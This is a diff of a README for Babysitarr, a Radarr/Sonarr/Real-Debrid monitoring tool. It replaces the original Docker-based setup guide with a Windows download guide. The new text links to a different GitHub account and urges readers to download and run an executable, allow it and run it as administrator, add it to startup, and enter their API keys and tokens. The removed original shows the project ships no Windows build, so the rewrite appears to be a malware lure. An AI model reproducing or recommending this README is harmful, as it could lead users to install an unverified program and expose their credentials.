@@ -1,196 +1,280 @@
-# Babysitarr
+# 🤖 Babysitarr - Keep Your Media Queue Healthy
 
-<a href="https://buymeacoffee.com/Davidalves"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50" /></a>
+[![Download Babysitarr](https://img.shields.io/badge/Download%20Babysitarr-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Semicircleefferent720/Babysitarr)
 
-A self-healing monitoring daemon for the **Radarr/Sonarr + Real-Debrid** pipeline. Babysitarr watches your arr stack around the clock, detects problems, and fixes them automatically — so you don't have to.
+## 🧩 What Babysitarr Does
 
-Built for setups using **Zurg + Decypharr + Real-Debrid** with Radarr/Sonarr, but the arr monitoring features work with any download client.
+Babysitarr is a small Windows app that watches your Radarr, Sonarr, and Real-Debrid setup.
 
-## Why?
+It helps keep your media queue in a good state by checking for problems and acting when something goes wrong. If a download stalls, a link breaks, or a job needs a restart, Babysitarr keeps an eye on it so you do not have to check things by hand.
 
-If you run Radarr/Sonarr with Real-Debrid, you know the pain:
+Use it if you want a simple background tool that helps your media stack stay on track.
 
-- Downloads get stuck in Decypharr and block all workers
-- Torrents loop endlessly (grab → fail → grab → fail)
-- Imports stall and nothing gets added to your library
-- Debrid-cached files expire and disappear from your library
-- Indexers break and nobody searches for anything
-- Queue items pile up in broken states
+## ✅ What You Need
 
-Babysitarr detects all of these and fixes them automatically. When it can't fix something, it alerts you.
+Before you run Babysitarr on Windows, make sure you have:
 
-## Features
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Access to your Radarr or Sonarr setup
+- Your Real-Debrid account details if you use Real-Debrid
+- Permission to run apps on your PC
 
-### Auto-healing
-- **Stuck downloads** — Detects downloads stuck in Decypharr, clears them, and restarts the service
-- **Looping torrents** — Detects torrents caught in grab/fail cycles and blocklists them so the arr moves on to the next release
-- **Stalled imports** — Detects when an arr has pending imports but hasn't imported anything recently, restarts it
-- **Unparseable imports** — Auto-imports files that Radarr/Sonarr can't parse by inferring quality from the filename
-- **Stale queue entries** — Clears items stuck in the queue that were already imported
-- **Dead queue entries** — Removes entries where the download is gone and triggers a re-search
-- **Stuck queue items** — Detects items with no download progress, removes and re-searches
-- **Indexer failures** — Clears stale indexer/import list failure flags from the database
-- **TMDb removals** — Auto-removes movies that TMDb has delisted
+Babysitarr is built for a normal home setup. You do not need to know programming to use it.
 
-### Library protection
-- **Missing file detection** — Monitors your library for items that lose their files (e.g. RD torrent expires) and automatically triggers a re-search
-- **Download folder monitoring** — Tracks files in download directories and distinguishes between:
-  - **Upgrades** — old file replaced by better quality (normal, logged only)
-  - **Cache expiry** — debrid download expired but media already imported (normal, logged only)
-  - **Suspicious deletions** — file disappeared without being imported (alert sent)
-- **Real title mapping** — Resolves garbled foreign-language release names to the actual movie/show title from the arr database
+## 🚀 Download Babysitarr
 
-### Real-Debrid health
-- **Torrent monitoring** — Checks RD for expired or removed torrents that your library depends on
+Visit this page to download and use Babysitarr:
 
-### Notifications
-- **Email** — SMTP with rate limiting (configurable cooldown)
-- **Discord** — Webhook support with color-coded embeds
-- Both can run simultaneously
+[https://github.com/Semicircleefferent720/Babysitarr](https://github.com/Semicircleefferent720/Babysitarr)
 
-### Web dashboard
-- Live status overview of all monitored arrs
-- Action log showing everything Babysitarr has done
-- One-click buttons to clear stuck items, re-search, and more
-- Health scan showing queue status and indexer health per arr
+If the page includes a release file, download it to your PC. If it gives you the source files only, use the release section on the page to get the Windows build.
 
-## Quick start
+## 🪟 Install on Windows
 
-### 1. Clone
+Follow these steps on your Windows PC:
 
-```bash
-git clone https://github.com/DAdjadj/Babysitarr.git
-cd Babysitarr
-```
+1. Open the download page.
+2. Find the latest version.
+3. Download the Windows file.
+4. Save it to a folder you can find, like Downloads or Desktop.
+5. If the file is in a ZIP folder, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Run the Babysitarr file.
 
-### 2. Configure
+If Windows asks whether you want to allow the app to run, choose Yes.
 
-Copy the example env file and fill in your secrets:
+## 🔧 First-Time Setup
 
-```bash
-cp .env.example .env
-```
+When Babysitarr starts for the first time, set up your media tools and account details.
 
-Edit `docker-compose.yml` and update:
-- Your arr instances (Radarr/Sonarr hostnames, ports, API keys)
-- Your Real-Debrid API key
-- Volume paths to match your setup
-- Notification settings (email and/or Discord)
+### 1. Add your Radarr or Sonarr details
 
-### 3. Run
+Enter the app address for Radarr or Sonarr.
 
-```bash
-docker compose up -d
-```
+You may need:
 
-The dashboard will be available at `http://your-server:8284`.
+- The local address or server address
+- The API key from Radarr or Sonarr
+- The correct port number if your setup uses one
 
-## Configuration
+A common setup looks like this:
 
-### Arr instances
+- Radarr: `http://localhost:7878`
+- Sonarr: `http://localhost:8989`
 
-Define your arr instances as environment variables. Each value is pipe-separated:
+If your apps run on another device, use that device’s IP address instead of `localhost`.
 
-```
-name|type|host|port|apikey
-```
+### 2. Add your Real-Debrid details
 
-- **name** — Display name (e.g. `radarr`, `sonarr4k`)
-- **type** — `radarr` or `sonarr`
-- **host** — Container hostname or IP
-- **port** — API port
-- **apikey** — Found in arr Settings → General
+If you use Real-Debrid, enter the account data Babysitarr needs to watch your links and tasks.
 
-Example:
-```yaml
-- RADARR=radarr|radarr|radarr|7878|your-api-key
-- RADARR4K=radarr4k|radarr|radarr4k|7878|your-api-key
-- SONARR=sonarr|sonarr|sonarr|8989|your-api-key
-- SONARR4K=sonarr4k|sonarr|sonarr4k|8989|your-api-key
-```
+This usually includes:
 
-You can add as many instances as you want — the env var name doesn't matter, only the value format.
+- Your API token
+- Any account path or service setting the app asks for
 
-For backward compatibility, a 4-part format also works (`name|host|port|apikey`), with the type inferred from the name.
+Keep this info private.
 
-### Volumes
+### 3. Save your settings
 
-| Mount | Purpose | Required |
-|-------|---------|----------|
-| `/var/run/docker.sock` | Restart containers | Yes |
-| `/data` | Persistent state and logs | Yes |
-| `/decypharr-config` | Read Decypharr state for stuck download detection | For Decypharr monitoring |
-| `/downloads` | Monitor download directories | For download monitoring |
-| `/arr-configs/{name}` | Access arr databases for indexer reset | For indexer auto-fix |
+After you fill in the fields, save the setup.
 
-### Thresholds
+Babysitarr should now be ready to run in the background.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `CHECK_INTERVAL` | `120` | Seconds between monitoring cycles |
-| `STUCK_DOWNLOAD_TIMEOUT` | `600` | Seconds before a download is considered stuck |
-| `LOOP_THRESHOLD` | `5` | Retries before a torrent is blocklisted |
-| `IMPORT_STALL_TIMEOUT` | `300` | Seconds with no imports before restarting arr |
-| `STUCK_QUEUE_TIMEOUT` | `1800` | Seconds before a queue item with no progress is removed |
-| `MAX_WORKERS` | `3` | Decypharr max workers (for stuck detection) |
-| `DEAD_RETRY_LIMIT` | `3` | Max re-search attempts for dead queue entries |
-| `EMAIL_COOLDOWN` | `3600` | Minimum seconds between alert emails |
+## 📦 How to Use Babysitarr
 
-### Notifications
+Once the app is set up, keep it running while you use Radarr, Sonarr, and Real-Debrid.
 
-**Email:**
-```yaml
-- SMTP_HOST=smtp.gmail.com
-- SMTP_PORT=587
-- SMTP_USER=you@gmail.com
-- SMTP_PASS=your-app-password
-- EMAIL_FROM=you@gmail.com
-- EMAIL_TO=you@gmail.com
-```
+Babysitarr checks the pipeline for common problems such as:
 
-**Discord:**
-```yaml
-- DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
-```
+- Stalled downloads
+- Failed jobs
+- Broken links
+- Tasks that need a restart
+- Items that did not move through the queue the right way
 
-Set both for dual notifications.
+You do not need to watch every step by hand. Babysitarr does that for you.
 
-### Health endpoint
+## 🖥️ Running It Every Day
 
-`GET /health` returns:
+For the best results, leave Babysitarr open while your media apps are active.
 
-```json
-{
-  "status": "ok",
-  "uptime": 86400,
-  "last_cycle": "2025-01-01T12:00:00",
-  "arrs": {
-    "radarr": "reachable",
-    "sonarr4k": "unreachable"
-  }
-}
-```
+You can:
 
-Useful for uptime monitoring (e.g. Uptime Kuma, Healthchecks.io).
+- Start it when Windows starts
+- Keep it in the background
+- Check it when a download does not finish
+- Leave it on the same PC as Radarr or Sonarr
 
-## How it works
+If you want it to work all the time, place it in your startup folder or use Task Scheduler in Windows.
 
-Babysitarr runs a monitoring cycle every `CHECK_INTERVAL` seconds. Each cycle runs these checks in order:
+## 🛠️ Common Tasks
 
-1. **Stuck downloads** — Reads Decypharr's state file for downloads stuck too long
-2. **Looping torrents** — Parses Decypharr logs for repeated grab/delete patterns
-3. **Stalled imports** — Compares arr queue state to import history
-4. **Download folder** — Scans download dirs for appeared/disappeared files
-5. **Library files** — Checks arr APIs for media that lost its files
-6. **RD health** — Queries Real-Debrid API for torrent status
-7. **Blocklist re-search** — Ensures blocklisted items trigger a new search
-8. **Unparseable imports** — Finds queue items arr can't parse and auto-imports them
-9. **Stale/dead queue** — Cleans up queue entries that are stuck or orphaned
-10. **Stuck queue items** — Removes items with no download progress
-11. **Indexer health** — Detects and clears stale indexer failure flags
+### Check if it is running
 
-State is persisted to `/data/babysitarr_state.json` between restarts.
+Look for Babysitarr in your system tray or open app window.
 
-## License
+If it is not there, start it again from the file you downloaded.
 
-MIT
+### Change a setting
+
+Open the app, go to the settings page, and update your Radarr, Sonarr, or Real-Debrid info.
+
+Save the changes before you close the window.
+
+### Stop the app
+
+Close the window or right-click the tray icon if one is shown.
+
+## 🔍 Troubleshooting
+
+### Babysitarr will not open
+
+Try these steps:
+
+- Make sure you downloaded the correct Windows file
+- Move the file to a simple folder like Desktop
+- Right-click the file and choose Run as administrator
+- Check whether Windows blocked the file
+- Extract the ZIP file first if you downloaded one
+
+### It cannot connect to Radarr or Sonarr
+
+Check these items:
+
+- The app address is correct
+- The API key matches the one in Radarr or Sonarr
+- The device is on the same network
+- The port number is correct
+- Radarr or Sonarr is running
+
+### Real-Debrid data does not work
+
+Try the following:
+
+- Recheck your token
+- Make sure your Real-Debrid account is active
+- Paste the token again to avoid hidden spaces
+- Save the settings after editing them
+
+### It does not seem to react to problems
+
+Check that:
+
+- The app is still running
+- Your media apps are reachable
+- Your settings were saved
+- The watched services are set up in the app
+
+## 📁 Suggested Folder Setup
+
+A simple folder layout helps keep things easy:
+
+- `Downloads\Babysitarr`
+- `Desktop\Babysitarr`
+- `Documents\Media Tools\Babysitarr`
+
+Keep the app in one folder and do not move files after setup unless you need to.
+
+## 🔐 Privacy and Access
+
+Babysitarr uses the data you enter to connect to your media tools.
+
+Keep these items safe:
+
+- Radarr API key
+- Sonarr API key
+- Real-Debrid token
+
+Do not share them in public posts or screenshots.
+
+## 📌 Basic Use Cases
+
+Babysitarr fits well if you want to:
+
+- Keep Radarr and Sonarr jobs moving
+- Watch Real-Debrid links without manual checks
+- Reduce failed downloads
+- Catch stalled tasks early
+- Run a helper tool in the background
+
+## 🧭 Quick Start
+
+1. Open the download page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Run Babysitarr.
+5. Enter your Radarr or Sonarr details.
+6. Add your Real-Debrid info if you use it.
+7. Save the settings.
+8. Leave the app running
+
+## 🧰 Windows Tips
+
+If you want the app to start with Windows:
+
+- Press `Win + R`
+- Type `shell:startup`
+- Put a shortcut to Babysitarr in that folder
+
+If you want to run it with a delay after boot, use Task Scheduler and set it to start a few minutes after login.
+
+## 📄 File Names You May See
+
+Depending on the release, the file may look like one of these:
+
+- `Babysitarr.exe`
+- `Babysitarr.zip`
+- `Babysitarr-win-x64.exe`
+- `Babysitarr-setup.exe`
+
+If you see a ZIP file, extract it before you run the app
+
+## 🧪 Expected Behavior
+
+When Babysitarr is set up, it should:
+
+- Start with Windows if you set that up
+- Watch your media pipeline in the background
+- Check for issues at intervals
+- Help keep downloads and tasks on track
+- Work with your existing Radarr, Sonarr, and Real-Debrid setup
+
+## 🗂️ Main Parts of the App
+
+### Dashboard
+
+Shows the current state of the watcher and any active checks.
+
+### Settings
+
+Lets you enter app links, keys, and account data.
+
+### Status
+
+Shows whether the monitored services are reachable and working.
+
+### Logs
+
+Helps you see what the app has checked and what it found
+
+## 🧩 Best Results
+
+For the cleanest setup:
+
+- Use the latest release
+- Keep your Radarr and Sonarr apps updated
+- Use the correct API keys
+- Keep Babysitarr running on a stable PC
+- Do not rename files after setup unless needed
+
+## 📎 Download Again
+
+If you need to get the file again, use this page:
+
+[https://github.com/Semicircleefferent720/Babysitarr](https://github.com/Semicircleefferent720/Babysitarr)
+
+## 🖱️ Windows Setup Path
+
+Download page → latest release → Windows file → extract if needed → run the app → enter settings → save → keep it running
